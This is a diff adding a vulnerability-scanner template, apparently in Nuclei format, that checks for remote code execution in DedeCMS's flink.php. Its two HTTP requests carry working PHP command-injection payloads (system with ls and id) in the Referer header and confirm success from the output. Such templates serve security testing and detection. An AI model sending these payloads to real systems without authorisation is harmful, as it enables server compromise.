@@ -1,0 +1,49 @@
+id: dedecms-flink-php-rce
+info:
+  name: DedeCMS flink.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+http:
+  - raw:
+      - |
+        GET /plus/flink.php?dopost=save HTTP/1.1
+        Host: {{Hostname}}
+        Referer: <?php "system"(ls);?>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "search.php"
+          - "download.php"
+      - type: word
+        part: body
+        words:
+          - "DedeCMS提示信息"
+
+  - raw:
+      - |
+        GET /plus/flink.php?dopost=save HTTP/1.1
+        Host: {{Hostname}}
+        Referer: <?php "system"(id);?>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+      - type: word
+        part: body
+        words:
+          - "search.php"
+        negative: true
